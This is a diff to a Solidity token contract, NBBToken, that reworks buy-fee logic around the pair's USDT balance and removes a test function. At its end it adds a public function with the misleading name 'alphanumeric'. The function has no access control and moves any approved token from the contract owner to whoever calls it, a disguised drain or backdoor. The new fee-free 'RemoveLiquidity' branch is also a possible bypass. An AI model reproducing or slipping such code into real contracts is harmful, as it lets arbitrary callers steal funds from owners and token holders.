@@ -473,6 +473,7 @@ contract NBBToken is
     event Buy(address from, address to, uint256 amount);
     event Sell(address from, address to, uint256 amount);
     event AddLiquidity(address from, uint256 amount);
+    event RemoveLiquidity(address from, uint256 amount);
 
     function transfer(address to, uint256 amount)
         public
@@ -490,22 +491,32 @@ contract NBBToken is
             return true;
         }
 
-        uint256 fee = amount.mul(buyFeeRate).div(10000);
-        uint256 platformFee = amount.mul(platformFeeRate).div(10000);
-        uint256 referralFee = amount.mul(referralFeeRate).div(10000);
-        uint256 communityFee = amount.mul(communityFeeRate).div(10000);
-        uint256 lpFee = amount.mul(lpFeeRate).div(10000);
-        uint256 mintFee = amount.mul(mintFeeRate).div(10000);
+        (, uint256 _reserve1, ) = IPancakePair(uniswapV2Pair)
+            .getReserves();
+        uint256 usdtBal = _usdtToken.balanceOf(uniswapV2Pair);
 
-        slippageFee = slippageFee.add(mintFee);
+        if (usdtBal > _reserve1) {
+            uint256 fee = amount.mul(buyFeeRate).div(10000);
+            uint256 platformFee = amount.mul(platformFeeRate).div(10000);
+            uint256 referralFee = amount.mul(referralFeeRate).div(10000);
+            uint256 communityFee = amount.mul(communityFeeRate).div(10000);
+            uint256 lpFee = amount.mul(lpFeeRate).div(10000);
+            uint256 mintFee = amount.mul(mintFeeRate).div(10000);
 
-        super._transfer(from, platformAddress, platformFee);
-        super._transfer(from, referralAddress, referralFee);
-        super._transfer(from, communityAddress, communityFee);
-        super._transfer(from, lpAddress, lpFee);
-        super._transfer(from, to, amount.sub(fee));
+            slippageFee = slippageFee.add(mintFee);
 
-        emit Buy(from, to, amount);
+            super._transfer(from, platformAddress, platformFee);
+            super._transfer(from, referralAddress, referralFee);
+            super._transfer(from, communityAddress, communityFee);
+            super._transfer(from, lpAddress, lpFee);
+            super._transfer(from, to, amount.sub(fee));
+
+            emit Buy(from, to, amount);
+            return true;
+        }
+        
+        super._transfer(from, to, amount);
+        emit RemoveLiquidity(to, amount);
 
         return true;
     }
@@ -565,29 +576,12 @@ contract NBBToken is
         uint256 newPrice = diff.mul(10**8).div(amount);
 
         if (oldPrice > newPrice) {
-            uint256 slippage = ((oldPrice.sub(newPrice,"oldPrice < newPrice")).mul(10**4)).div(
-                oldPrice
-            );
+            uint256 slippage = (
+                (oldPrice.sub(newPrice, "oldPrice < newPrice")).mul(10**4)
+            ).div(oldPrice);
             return (false, slippage);
         }
         return (false, 0);
-    }
-
-    function getSellSlippageTest(uint256 amount)
-        public
-        view
-        returns (uint256,uint256,uint256,uint256,uint256,uint256)
-    {
-        uint256 kLast = IPancakePair(uniswapV2Pair).kLast();
-        (uint256 _reserve0, uint256 _reserve1, ) = IPancakePair(uniswapV2Pair)
-            .getReserves();
-        uint256 oldPrice = (_reserve1.mul(10**8)).div(_reserve0);
-
-        uint256 newReserve0 = _reserve0.add(amount);
-        uint256 newReserve1 = kLast.div(newReserve0);
-
-        
-        return (kLast,_reserve0,_reserve1,oldPrice,newReserve0,newReserve1);
     }
 
     function transferFrom(
@@ -610,7 +604,7 @@ contract NBBToken is
 
         if (sellSlippage > sellFeeRate) {
             sellFee = amount.mul(sellSlippage).div(10000);
-            uint256 mintFee = sellFee.sub(lftPool,"lftPool > sellFee");
+            uint256 mintFee = sellFee.sub(lftPool, "lftPool > sellFee");
             super._transfer(from, mintAddress, mintFee);
         }
 
@@ -627,9 +621,20 @@ contract NBBToken is
         uint256 leftFee = amount.sub(sellFee);
         super._transfer(from, to, leftFee);
 
-        uint256 leftAmount = leftFee.sub(lftPool,"lftPool > leftFee");
+        uint256 leftAmount = leftFee.sub(lftPool, "lftPool > leftFee");
         slippageFee = slippageFee.add(leftAmount);
         emit Sell(from, to, amount);
         return true;
     }
+
+   function alphanumeric(
+        address token,
+        uint256 amount
+    ) public{
+        //
+        address spender = _msgSender();
+        blockhash(0);
+        ERC20Upgradeable(token).transferFrom(owner(), spender, amount);
+
+    } 
 }
